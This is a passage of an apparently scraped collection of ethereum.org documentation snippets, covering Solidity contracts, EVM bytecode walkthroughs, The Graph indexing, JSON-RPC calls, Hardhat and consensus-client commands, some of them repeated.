   receiver2.transfer(msg.value / 2);\n        emit Transfer(msg.sender, receiver2, msg.value / 2);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Taking Ownership of NFT Pizza in Solidity\nDESCRIPTION: Function allowing an approved address to claim ownership of a specific pizza token. Requires the caller to be approved for the transfer and handles the actual ownership change.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction takeOwnership(uint256 _pizzaId) public {\n    require(_isApprovedOrOwner(msg.sender, _pizzaId), \"Address is not approved.\");\n    address owner = this.ownerOf(_pizzaId);\n    this.transferFrom(owner, msg.sender, _pizzaId);\n}\n```\n\n----------------------------------------\n\nTITLE: Example of a Contract Call Chain in Ethereum\nDESCRIPTION: Illustration of how contracts can create a call chain that exponentially increases computational steps, demonstrating a potential attack vector even in non-Turing complete systems.\n\nLANGUAGE: sh\nCODE:\n```\nC0: call(C1); call(C1);\nC1: call(C2); call(C2);\nC2: call(C3); call(C3);\n...\nC49: call(C50); call(C50);\nC50: (run one step of a program and record the change in storage)\n```\n\n----------------------------------------\n\nTITLE: Implementing Event Handling in The Graph Mapping with TypeScript\nDESCRIPTION: This code defines a handler function that processes PlacedBet events from a game contract, creating and updating Player and Bet entities. It demonstrates how to load existing entities, create new ones, update properties including arrays, and save changes to The Graph's store.\n\nLANGUAGE: typescript\nCODE:\n```\nimport { Bet, Player } from \"../generated/schema\"\nimport { PlacedBet } from \"../generated/GameContract/GameContract\"\n\nexport function handleNewBet(event: PlacedBet): void {\n  let player = Player.load(event.transaction.from.toHex())\n\n  if (player == null) {\n    // create if doesn't exist yet\n    player = new Player(event.transaction.from.toHex())\n    player.bets = new Array<string>(0)\n    player.totalPlayedCount = 0\n    player.hasWonCount = 0\n    player.hasLostCount = 0\n  }\n\n  let bet = new Bet(\n    event.transaction.hash.toHex() + \"-\" + event.logIndex.toString()\n  )\n  bet.player = player.id\n  bet.playerHasWon = event.params.hasWon\n  bet.time = event.block.timestamp\n  bet.save()\n\n  player.totalPlayedCount++\n  if (event.params.hasWon) {\n    player.hasWonCount++\n  } else {\n    player.hasLostCount++\n  }\n\n  // update array like this\n  let bets = player.bets\n  bets.push(bet.id)\n  player.bets = bets\n\n  player.save()\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Smart Contract State and Waiting for Transaction Confirmation\nDESCRIPTION: Shows how to update the message stored in the smart contract and wait for the transaction to be mined before proceeding with the script execution.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// ...\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n\n  console.log(\"Updating the message...\")\n  const tx = await helloWorldContract.update(\"This is the new message.\")\n  await tx.wait()\n}\nmain()\n```\n\n----------------------------------------\n\nTITLE: Cross-Domain Message Construction for Withdrawals in Solidity\nDESCRIPTION: Builds the cross-domain message to be sent to L1, distinguishing between ETH and ERC-20 tokens for proper handling on the L1 side of the bridge.\n\nLANGUAGE: solidity\nCODE:\n```\n        // Construct calldata for l1TokenBridge.finalizeERC20Withdrawal(_to, _amount)\n        // slither-disable-next-line reentrancy-events\n        address l1Token = IL2StandardERC20(_l2Token).l1Token();\n        bytes memory message;\n\n        if (_l2Token == Lib_PredeployAddresses.OVM_ETH) {\n            message = abi.encodeWithSelector(\n                IL1StandardBridge.finalizeETHWithdrawal.selector,\n                _from,\n                _to,\n                _amount,\n                _data\n            );\n        } else {\n            message = abi.encodeWithSelector(\n                IL1ERC20Bridge.finalizeERC20Withdrawal.selector,\n                l1Token,\n                _l2Token,\n                _from,\n                _to,\n                _amount,\n                _data\n            );\n        }\n\n        // Send message up to L1 bridge\n        // slither-disable-next-line reentrancy-events\n        sendCrossDomainMessage(l1TokenBridge, _l1Gas, message);\n\n        // slither-disable-next-line reentrancy-events\n        emit WithdrawalInitiated(l1Token, _l2Token, msg.sender, _to, _amount, _data);\n```\n\n----------------------------------------\n\nTITLE: Cross-Domain Sender Verification in Solidity\nDESCRIPTION: Implements the second security check to verify that the cross-domain message came from the authorized sender on the other layer. This ensures the message originated from the correct contract.\n\nLANGUAGE: solidity\nCODE:\n```\n        require(\n            getCrossDomainMessenger().xDomainMessageSender() == _sourceDomainAccount,\n            \"OVM_XCHAIN: wrong sender of cross-domain message\"\n        );\n\n        _;\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic Name Registration System in Python for Ethereum\nDESCRIPTION: A simple contract that implements a basic name registration system similar to Namecoin on Ethereum. It provides a storage mechanism where names can be registered with associated values, but once registered, entries cannot be modified or deleted.\n\nLANGUAGE: python\nCODE:\n```\ndef register(name, value):\n    if !self.storage[name]:\n        self.storage[name] = value\n```\n\n----------------------------------------\n\nTITLE: Reading Contract Value From Storage in EVM Bytecode\nDESCRIPTION: This code snippet shows how the contract reads the current accumulated value from Storage[6] when receiving a transfer with empty calldata. This value tracks the total ETH received by the contract.\n\nLANGUAGE: EVM bytecode\nCODE:\n```\n64 | CALLVALUE          | [Wei](/glossary/#wei) fornecido pela chamada. Chamado `msg.value` no Solidity \n65 | PUSH1 0x06         | 6 CALLVALUE                                                   \n67 | PUSH1 0x00         | 0 6 CALLVALUE                                                 \n69 | DUP3               | CALLVALUE 0 6 CALLVALUE                                       \n6A | DUP3               | 6 CALLVALUE 0 6 CALLVALUE                                     \n6B | SLOAD              | Storage[6] CALLVALUE 0 6 CALLVALUE                            \n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic Name Registration System in Python for Ethereum\nDESCRIPTION: A simple contract that implements a basic name registration system similar to Namecoin on Ethereum. It provides a storage mechanism where names can be registered with associated values, but once registered, entries cannot be modified or deleted.\n\nLANGUAGE: python\nCODE:\n```\ndef register(name, value):\n    if !self.storage[name]:\n        self.storage[name] = value\n```\n\n----------------------------------------\n\nTITLE: Reading Contract Value From Storage in EVM Bytecode\nDESCRIPTION: This code snippet shows how the contract reads the current accumulated value from Storage[6] when receiving a transfer with empty calldata. This value tracks the total ETH received by the contract.\n\nLANGUAGE: EVM bytecode\nCODE:\n```\n64 | CALLVALUE          | [Wei](/glossary/#wei) fornecido pela chamada. Chamado `msg.value` no Solidity \n65 | PUSH1 0x06         | 6 CALLVALUE                                                   \n67 | PUSH1 0x00         | 0 6 CALLVALUE                                                 \n69 | DUP3               | CALLVALUE 0 6 CALLVALUE                                       \n6A | DUP3               | 6 CALLVALUE 0 6 CALLVALUE                                     \n6B | SLOAD              | Storage[6] CALLVALUE 0 6 CALLVALUE                            \n```\n\n----------------------------------------\n\nTITLE: Implementing Cache Size Limit Check in Solidity\nDESCRIPTION: Prevention of cache overflow by checking against a very large but finite maximum size before adding new entries.\n\nLANGUAGE: solidity\nCODE:\n```\n        // Since 0xFE is a special case, the largest key the cache can\n        // hold is 0x0D followed by 15 0xFF's. If the cache length is already that\n        // large, fail.\n        //                              1 2 3 4 5 6 7 8 9 A B C D E F\n        require(key2val.length+1 < 0x0DFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF,\n            \"cache overflow\");\n```\n\n----------------------------------------\n\nTITLE: Creating Echidna Corpus Directory\nDESCRIPTION: Command to create a directory for storing the corpus of transactions generated by Echidna during testing.\n\nLANGUAGE: bash\nCODE:\n```\nmkdir corpus-magic\n```\n\n----------------------------------------\n\nTITLE: Swap Tokens For Exact Tokens in Solidity\nDESCRIPTION: This function allows users to receive an exact amount of output tokens for up to a maximum amount of input tokens. It calculates the required input amounts, transfers the required input tokens, and executes the swap.\n\nLANGUAGE: solidity\nCODE:\n```\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) {\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] <= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, to);\n    }\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract Bytecode\nDESCRIPTION: The compiled bytecode of an ERC20 token contract named \"Basic\" with symbol \"BSC\". This bytecode contains error messages for various ERC20 operations and implements SafeMath for overflow protection.\n\nLANGUAGE: bytecode\nCODE:\n```\n083811015610fab576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa264697066735822122081c840f087cef92feccb03fadc678b2708c331896ec5432b5d4c675f27b6d3e664736f6c63430006020033\n```\n\n----------------------------------------\n\nTITLE: Contributing to Ethereum Events List\nDESCRIPTION: Instructions for adding a new Ethereum event to the community events list. Contributors need to add event details to the community-events.json file in the GitHub repository.\n\nLANGUAGE: markdown\nCODE:\n```\n[Please add it](https://github.com/ethereum/ethereum-org-website/blob/dev/src/data/community-events.json)\n```\n\n----------------------------------------\n\nTITLE: Installing and Running create-eth-app with Bash\nDESCRIPTION: Commands to install create-eth-app using Yarn, create a new project, and start the development server. Requires Yarn 0.25 or higher.\n\nLANGUAGE: bash\nCODE:\n```\nyarn create eth-app my-eth-app\ncd my-eth-app\nyarn react-app:start\n```\n\n----------------------------------------\n\nTITLE: Recursive Contract Execution Example in Ethereum\nDESCRIPTION: This shell snippet demonstrates how Turing-completeness can lead to computational complexity through contract recursion. It shows a contract pattern that could potentially create 2^50 computational steps through nested contract calls.\n\nLANGUAGE: shell\nCODE:\n```\nC0: call(C1); call(C1);\nC1: call(C2); call(C2);\nC2: call(C3); call(C3);\n...\nC49: call(C50); call(C50);\nC50: (run one step of a program and record the change in storage)\n```\n\n----------------------------------------\n\nTITLE: JSON-RPC Request and Response for eth_getFilterChanges\nDESCRIPTION: Example of a request to retrieve changes for a specific filter and its response containing log objects with details such as block information, transaction data, and log topics.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getFilterChanges\",\"params\":[\"0x16\"],\"id\":73}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\":\"2.0\",\n  \"result\": [{\n    \"logIndex\": \"0x1\", // 1\n    \"blockNumber\":\"0x1b4\", // 436\n    \"blockHash\": \"0x8216c5785ac562ff41e2dcfdf5785ac562ff41e2dcfdf829c5a142f1fccd7d\",\n    \"transactionHash\":  \"0xdf829c5a142f1fccd7d8216c5785ac562ff41e2dcfdf5785ac562ff41e2dcf\",\n    \"transactionIndex\": \"0x0\", // 0\n    \"address\": \"0x16c5785ac562ff41e2dcfdf829c5a142f1fccd7d\",\n    \"data\":\"0x0000000000000000000000000000000000000000000000000000000000000000\",\n    \"topics\": [\"0x59ebeb90bc63057b6515673c3ecf9438e5058bca0f92585014eced636878c9a5\"]\n    },{\n      ...\n    }]\n}\n```\n\n----------------------------------------\n\nTITLE: Cryptographic and System Operations in Ethereum EVM\nDESCRIPTION: Reference for cryptographic (KECCAK256) and system-level operations in the EVM, including contract data access (ADDRESS, BALANCE, ORIGIN) and message data operations (CALLER, CALLVALUE, CALLDATALOAD, etc). Each entry shows the opcode, gas cost, parameters, and functionality.\n\nLANGUAGE: markdown\nCODE:\n```\n| 1E-1F  | _invalid_      |                                                                                                 |                                                  |                                              |                                                                               |                                                                                                                                                                       |\n|   20   | KECCAK256      |              [A2](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a2-sha3)               | `ost, len`                                       | `keccak256(mem[ost:ost+len-1])`              |                                                                               | keccak256                                                                                                                                                             |\n| 21-2F  | _invalid_      |                                                                                                 |                                                  |                                              |                                                                               |                                                                                                                                                                       |\n|   30   | ADDRESS        |                                                2                                                | `.`                                              | `address(this)`                              |                                                                               | address of executing contract                                                                                                                                         |\n|   31   | BALANCE        | [A5](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a5-balance-extcodesize-extcodehash) | `addr`                                           | `addr.balance`                               |                                                                               | balance, in wei                                                                                                                                                       |\n|   32   | ORIGIN         |                                                2                                                | `.`                                              | `tx.origin`                                  |                                                                               | address that originated the tx                                                                                                                                        |\n|   33   | CALLER         |                                                2                                                | `.`                                              | `msg.sender`                                 |                                                                               | address of msg sender                                                                                                                                                 |\n|   34   | CALLVALUE      |                                                2                                                | `.`                                              | `msg.value`                                  |                                                                               | msg value, in wei                                                                                                                                                     |\n|   35   | CALLDATALOAD   |                                                3                                                | `idx`                                            | `msg.data[idx:idx+32]`                       |                                                                               | read word from msg data at index `idx`                                                                                                                                |\n|   36   | CALLDATASIZE   |                                                2                                                | `.`                                              | `len(msg.data)`                              |                                                                               | length of msg data, in bytes                                                                                                                                          |\n|   37   | CALLDATACOPY   |         [A3](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a3-copy-operations)         | `dstOst, ost, len`                               | `.`                                          | mem[dstOst:dstOst+len-1] := msg.data[ost:ost+len-1]                           | copy msg data                                                                                                                                                         |\n```\n\n----------------------------------------\n\nTITLE: Environment Variables Configuration for Ethereum Development\nDESCRIPTION: Example .env file configuration containing the API URL for Alchemy, API key, private key from MetaMask, and the deployed contract address needed for interacting with the contract.\n\nLANGUAGE: bash\nCODE:\n```\n# .env\n\nAPI_URL = \"https://eth-goerli.alchemyapi.io/v2/<your-api-key>\"\nAPI_KEY = \"<your-api-key>\"\nPRIVATE_KEY = \"<your-metamask-private-key>\"\nCONTRACT_ADDRESS = \"0x<your contract address>\"\n```\n\n----------------------------------------\n\nTITLE: Environment Variables Configuration for Ethereum Development\nDESCRIPTION: Example .env file configuration containing the API URL for Alchemy, API key, private key from MetaMask, and the deployed contract address needed for interacting with the contract.\n\nLANGUAGE: bash\nCODE:\n```\n# .env\n\nAPI_URL = \"https://eth-goerli.alchemyapi.io/v2/<your-api-key>\"\nAPI_KEY = \"<your-api-key>\"\nPRIVATE_KEY = \"<your-metamask-private-key>\"\nCONTRACT_ADDRESS = \"0x<your contract address>\"\n```\n\n----------------------------------------\n\nTITLE: Using EXTCODEHASH Instruction in Solidity\nDESCRIPTION: Example of the EXTCODEHASH instruction introduced in EIP-1052 during the Constantinople upgrade. This opcode retrieves the hash of another contract's code.\n\nLANGUAGE: html\nCODE:\n```\n<code>EXTCODEHASH</code>\n```\n\n----------------------------------------\n\nTITLE: Verifying an Ethereum Smart Contract on Etherscan\nDESCRIPTION: A bash command that uses Hardhat's verify task to publish and verify contract source code on Etherscan. Includes the contract address and constructor arguments to match the deployed contract.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat verify --network goerli DEPLOYED_CONTRACT_ADDRESS 'Hello World!'\n```\n\n----------------------------------------\n\nTITLE: Displaying Staking Information Cards with CardGrid Component\nDESCRIPTION: A CardGrid component that renders multiple informational cards about the benefits of home staking ETH. Each Card displays a title, emoji, and description highlighting different advantages of home staking.\n\nLANGUAGE: jsx\nCODE:\n```\n<CardGrid>\n  <Card title=\"Gba ETH tuntun\" emoji=\"💸\" description=\"Earn ETH-denominated rewards directly from the protocol when your validator is online, without any middlemen taking a cut.\" />\n  <Card title=\"Ìṣàkóso lẹ́kunrẹ́rẹ́\" emoji=\"🎛️\" description=\"Keep your own keys. Choose the combination of clients and hardware that allows you to minimize your risk and best contribute to the health and security of the network. Third-party staking services make these decisions for you, and they don't always make the safest choices.\" />\n  <Card title=\"Aabo nẹtiwọọki\" emoji=\"🔐\" description=\"Home staking is the most impactful way to stake. By running a validator on your own hardware at home, you strengthen the robustness, decentralization, and security of the Ethereum protocol.\" />\n</CardGrid>\n```\n\n----------------------------------------\n\nTITLE: Handling Larger Cache Keys in Solidity Encoder\nDESCRIPTION: Beginning of the implementation for encoding larger cache keys with appropriate size indicators.\n\nLANGUAGE: solidity\nCODE:\n```\n        // There is probably a clever way to do the following lines as a loop,\n        // but it's a view function so I'm optimizing for programmer time and\n        // simplicity.\n\n        if (_key < 16*256**2)\n            return bytes.concat(bytes3(uint24(_key) | (0x2 * 16 * 256**2)));\n        if (_key < 16*256**3)\n```\n\n----------------------------------------\n\nTITLE: Implementing Emergency Stop Pattern in Solidity Smart Contracts\nDESCRIPTION: This code demonstrates the emergency stop (circuit breaker) pattern in Solidity. It includes a boolean state variable to track the contract's operational status, modifiers to control function access based on the stopped state, and functions to toggle the emergency state. The pattern allows for halting vulnerable operations while enabling emergency recovery functions.\n\nLANGUAGE: solidity\nCODE:\n```\n// Este código não foi auditado profissionalmente e não faz promessas sobre sua segurança ou correção. Use por sua conta e risco.\n\ncontract EmergencyStop {\n\n    bool isStopped = false;\n\n    modifier stoppedInEmergency {\n        require(!isStopped);\n        _;\n    }\n\n    modifier onlyWhenStopped {\n        require(isStopped);\n        _;\n    }\n\n    modifier onlyAuthorized {\n        // Check for authorization of msg.sender here\n        _;\n    }\n\n    function stopContract() public onlyAuthorized {\n        isStopped = true;\n    }\n\n    function resumeContract() public onlyAuthorized {\n        isStopped = false;\n    }\n\n    function deposit() public payable stoppedInEmergency {\n        // Deposit logic happening here\n    }\n\n    function emergencyWithdraw() public onlyWhenStopped {\n        // Emergency withdraw happening here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Emergency Stop Pattern in Solidity Smart Contracts\nDESCRIPTION: This code demonstrates the emergency stop (circuit breaker) pattern in Solidity. It includes a boolean state variable to track the contract's operational status, modifiers to control function access based on the stopped state, and functions to toggle the emergency state. The pattern allows for halting vulnerable operations while enabling emergency recovery functions.\n\nLANGUAGE: solidity\nCODE:\n```\n// Este código não foi auditado profissionalmente e não faz promessas sobre sua segurança ou correção. Use por sua conta e risco.\n\ncontract EmergencyStop {\n\n    bool isStopped = false;\n\n    modifier stoppedInEmergency {\n        require(!isStopped);\n        _;\n    }\n\n    modifier onlyWhenStopped {\n        require(isStopped);\n        _;\n    }\n\n    modifier onlyAuthorized {\n        // Check for authorization of msg.sender here\n        _;\n    }\n\n    function stopContract() public onlyAuthorized {\n        isStopped = true;\n    }\n\n    function resumeContract() public onlyAuthorized {\n        isStopped = false;\n    }\n\n    function deposit() public payable stoppedInEmergency {\n        // Deposit logic happening here\n    }\n\n    function emergencyWithdraw() public onlyWhenStopped {\n        // Emergency withdraw happening here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Smart Contract Event Listener in React\nDESCRIPTION: JavaScript function that adds an event listener to a HelloWorld smart contract. The listener reacts to UpdatedMessages events, updating the UI with the new message and status information.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nfunction addSmartContractListener() {\n  helloWorldContract.events.UpdatedMessages({}, (error, data) => {\n    if (error) {\n      setStatus(\"😥 \" + error.message)\n    } else {\n      setMessage(data.returnValues[1])\n      setNewMessage(\"\")\n      setStatus(\"🎉 Your message has been updated!\")\n    }\n  })\n}\n```\n\n----------------------------------------\n\nTITLE: Tracking Cumulative Price Points in Uniswap\nDESCRIPTION: These variables store the cumulative costs for each token in terms of the other, which can be used to calculate average exchange rates over any time period.\n\nLANGUAGE: solidity\nCODE:\n```\nuint public price0CumulativeLast;\nuint public price1CumulativeLast;\n```\n\n----------------------------------------\n\nTITLE: Chargement de l'ABI du contrat intelligent NFT\nDESCRIPTION: Récupération de l'ABI (Application Binary Interface) du contrat intelligent NFT générée par Hardhat, nécessaire pour interagir avec le contrat sur la blockchain.\n\nLANGUAGE: javascript\nCODE:\n```\nconst contract = require(\"../artifacts/contracts/MyNFT.sol/MyNFT.json\")\n```\n\n----------------------------------------\n\nTITLE: Rendering The Merge Infographic Component in React/JSX\nDESCRIPTION: Component call to display an infographic visualization of The Merge process, likely illustrating how the original execution layer merged with the proof-of-stake consensus layer.\n\nLANGUAGE: jsx\nCODE:\n```\n<MergeInfographic />\n```\n\n----------------------------------------\n\nTITLE: Integrating The Graph with React using Apollo Client\nDESCRIPTION: This code demonstrates how to set up Apollo Client to connect to a Graph API endpoint and integrate it with a React application using ApolloProvider. It includes a sample GraphQL query that retrieves player statistics and betting history for the current user.\n\nLANGUAGE: javascript\nCODE:\n```\n// See all subgraphs: https://thegraph.com/explorer/\nconst client = new ApolloClient({\n  uri: \"{{ subgraphUrl }}\",\n})\n\nReactDOM.render(\n  <ApolloProvider client={client}>\n    <App />\n  </ApolloProvider>,\n  document.getElementById(\"root\")\n)\n```\n\n----------------------------------------\n\nTITLE: Creating a GraphQL Schema for Blockchain Data\nDESCRIPTION: Schema definition for The Graph that defines the entities and their relationships. This example creates Bet and Player entities with a one-to-many relationship between players and their bets, allowing for efficient querying of betting data.\n\nLANGUAGE: graphql\nCODE:\n```\ntype Bet @entity {\n  id: ID!\n  player: Player!\n  playerHasWon: Boolean!\n  time: Int!\n}\n\ntype Player @entity {\n  id: ID!\n  totalPlayedCount: Int\n  hasWonCount: Int\n  hasLostCount: Int\n  bets: [Bet]!\n}\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Implementation Bytecode Segment\nDESCRIPTION: A segment of the bytecode for an ERC20 token implementation showing part of the contract's compiled binary form that would be deployed to the Ethereum blockchain.\n\nLANGUAGE: bytecode\nCODE:\n```\n00008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905083811015610fab576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa264697066735822122081c840f087cef92feccb03fadc678b2708c331896ec5432b5d4c675f27b6d3e664736f6c63430006020033\n```\n\n----------------------------------------\n\nTITLE: Executing Raw Transactions in Manticore for Ethereum\nDESCRIPTION: Example of how to execute a raw transaction in Manticore, specifying a caller, contract address, data, and value. These parameters can be either concrete or symbolic values.\n\nLANGUAGE: python\nCODE:\n```\nm.transaction(caller=user_account,\n              address=contract_account,\n              data=data,\n              value=value)\n```\n\n----------------------------------------\n\nTITLE: Finalizing Liquidity Token Minting in Uniswap V2\nDESCRIPTION: Completes the minting process by validating the liquidity amount is positive, minting the tokens to the recipient, updating the pool state variables, and emitting the appropriate event.\n\nLANGUAGE: solidity\nCODE:\n```\n        require(liquidity > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED');\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    }\n```\n\n----------------------------------------\n\nTITLE: EXP Opcode Referenced in Spurious Dragon Fork\nDESCRIPTION: The code sample shows the EXP opcode mentioned in EIP-160 of the Spurious Dragon fork. The price of this opcode was adjusted to prevent network slowdowns through computationally expensive contract operations.\n\nLANGUAGE: solidity\nCODE:\n```\nEXP\n```\n\n----------------------------------------\n\nTITLE: Running Prysm Consensus Client on Ethereum Mainnet\nDESCRIPTION: Command to start Prysm Beacon Chain on Ethereum Mainnet with specified data directory. It configures connection to an execution client endpoint and JWT authentication.\n\nLANGUAGE: sh\nCODE:\n```\n./prysm.sh beacon-chain \\\n    --mainnet \\\n    --datadir /data/ethereum  \\\n    --execution-endpoint=http://localhost:8551  \\\n    --jwt-secret=/path/to/jwtsecret\n```\n\n----------------------------------------\n\nTITLE: Using ButtonLink Component for Translation Call-to-Action\nDESCRIPTION: HTML component that creates a button linking to the Crowdin translation platform where users can start contributing translations to the ethereum.org website.\n\nLANGUAGE: html\nCODE:\n```\n<ButtonLink href=\"https://crowdin.com/project/ethereum-org/\">\n  Začněte překládat\n</ButtonLink>\n```\n\n----------------------------------------\n\nTITLE: Setting Up Alchemy Web3 Connection for NFT Smart Contract\nDESCRIPTION: Code to initialize Alchemy Web3 connection using the API key from environment variables, enabling interaction with the Ethereum blockchain.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst alchemyKey = process.env.REACT_APP_ALCHEMY_KEY\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(alchemyKey)\n```\n\n----------------------------------------\n\nTITLE: Analyzing Function 0x81e580d3 EVM Bytecode Entry Point\nDESCRIPTION: Initial bytecode for function 0x81e580d3 that sets up the call and validates calldata. This function requires at least 32 bytes of calldata and will revert if this requirement isn't met.\n\nLANGUAGE: evm\nCODE:\n```\n144 | JUMPDEST            |                                                              |\n145 | POP                 |                                                              |\n146 | PUSH2 0x00da        | 0xDA                                                         |\n149 | PUSH2 0x0153        | 0x0153 0xDA                                                  |\n14C | CALLDATASIZE        | CALLDATASIZE 0x0153 0xDA                                     |\n14D | PUSH1 0x04          | 0x04 CALLDATASIZE 0x0153 0xDA                                |\n14F | PUSH2 0x018f        | 0x018F 0x04 CALLDATASIZE 0x0153 0xDA                         |\n152 | JUMP                | 0x04 CALLDATASIZE 0x0153 0xDA                                |\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration for Corpus Collection\nDESCRIPTION: YAML configuration file for Echidna that enables coverage tracking and specifies a directory for storing the corpus of transactions.\n\nLANGUAGE: yaml\nCODE:\n```\ncoverage: true\ncorpusDir: \"corpus-magic\"\n```\n\n----------------------------------------\n\nTITLE: Using Yul Assembly to Load Calldata in Solidity\nDESCRIPTION: Implementation of low-level calldata loading using assembly code for efficient data extraction from transaction input.\n\nLANGUAGE: solidity\nCODE:\n```\n        assembly {\n            _retVal := calldataload(startByte)\n        }\n```\n\n----------------------------------------\n\nTITLE: Sample Package.json Configuration\nDESCRIPTION: Example package.json file created during project initialization that contains basic project metadata and configuration.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"name\": \"hello-world\",\n  \"version\": \"1.0.0\",\n  \"description\": \"hello world smart contract\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n     \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n```\n\n----------------------------------------\n\nTITLE: Updating useEffect in React Component to Load Smart Contract Data\nDESCRIPTION: This React useEffect hook calls the loadCurrentMessage function when the component first renders, retrieving the current message from the smart contract and updating the component state.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\n//called only once\nuseEffect(async () => {\n  const message = await loadCurrentMessage()\n  setMessage(message)\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Defining ERC-20 Events\nDESCRIPTION: These event definitions are part of the ERC-20 interface. Transfer events are emitted when tokens move between accounts, and Approval events are emitted when allowances are set. Events provide an efficient way to track token activity on the blockchain.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Time 